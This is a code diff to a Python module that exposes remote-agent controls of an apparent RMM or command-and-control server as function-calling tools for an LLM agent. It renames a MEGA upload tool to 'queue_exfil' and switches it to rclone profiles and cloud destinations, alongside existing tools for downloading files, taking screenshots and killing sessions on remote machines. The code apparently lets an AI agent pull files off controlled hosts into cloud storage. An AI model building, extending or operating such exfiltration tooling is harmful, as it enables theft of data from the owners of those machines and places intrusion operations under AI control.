@@ -189,11 +189,17 @@ def tool_queue_download(client: RmmApiClient, session_ref: str, remote_path: str
     return _json_result({"ok": code == 200, "status": code, "queued": remote_path, "data": data})
 
 
-def tool_queue_mega(client: RmmApiClient, session_ref: str, remote_path: str) -> str:
+def tool_queue_exfil(
+    client: RmmApiClient,
+    session_ref: str,
+    remote_path: str,
+    profile: str | None = None,
+    dest: str | None = None,
+) -> str:
     sid, _ = _resolve_session_id(client, session_ref)
     if not sid:
         return _json_result({"ok": False, "error": "session_not_found"})
-    code, data = client.queue_mega(sid, remote_path)
+    code, data = client.queue_exfil(sid, remote_path, profile=profile, dest=dest)
     return _json_result({
         "ok": code == 200,
         "status": code,
@@ -202,8 +208,8 @@ def tool_queue_mega(client: RmmApiClient, session_ref: str, remote_path: str) ->
     })
 
 
-def tool_get_mega_config(client: RmmApiClient) -> str:
-    code, data = client.get_mega_config()
+def tool_get_rclone_config(client: RmmApiClient) -> str:
+    code, data = client.get_rclone_config()
     return _json_result({"ok": code == 200, "status": code, "data": data})
 
 
@@ -296,8 +302,10 @@ TOOL_HANDLERS = {
     ),
     "kill_session": lambda c, a: tool_kill_session(c, a["session_ref"]),
     "queue_download": lambda c, a: tool_queue_download(c, a["session_ref"], a["remote_path"]),
-    "queue_mega": lambda c, a: tool_queue_mega(c, a["session_ref"], a["remote_path"]),
-    "get_mega_config": lambda c, a: tool_get_mega_config(c),
+    "queue_exfil": lambda c, a: tool_queue_exfil(
+        c, a["session_ref"], a["remote_path"], a.get("profile"), a.get("dest")
+    ),
+    "get_rclone_config": lambda c, a: tool_get_rclone_config(c),
     "queue_screenshot": lambda c, a: tool_queue_screenshot(c, a["session_ref"]),
     "queue_upload": lambda c, a: tool_queue_upload(
         c, a["session_ref"], a["local_path"], a["remote_path"]
@@ -461,13 +469,15 @@ OPENAI_TOOLS: list[dict] = [
     {
         "type": "function",
         "function": {
-            "name": "queue_mega",
-            "description": "Queue upload of a remote agent file to MEGA (server account; link in events).",
+            "name": "queue_exfil",
+            "description": "Queue upload of a remote agent file via rclone (agent-side; link in events).",
             "parameters": {
                 "type": "object",
                 "properties": {
                     "session_ref": {"type": "string"},
                     "remote_path": {"type": "string"},
+                    "profile": {"type": "string", "description": "Named rclone profile on server"},
+                    "dest": {"type": "string", "description": "Optional cloud destination path"},
                 },
                 "required": ["session_ref", "remote_path"],
             },
@@ -476,8 +486,8 @@ OPENAI_TOOLS: list[dict] = [
     {
         "type": "function",
         "function": {
-            "name": "get_mega_config",
-            "description": "Show MEGA account configuration on the RMM server (masked email, folder, limits).",
+            "name": "get_rclone_config",
+            "description": "Show rclone profiles and binary status on the RMM server.",
             "parameters": {"type": "object", "properties": {}},
         },
     },
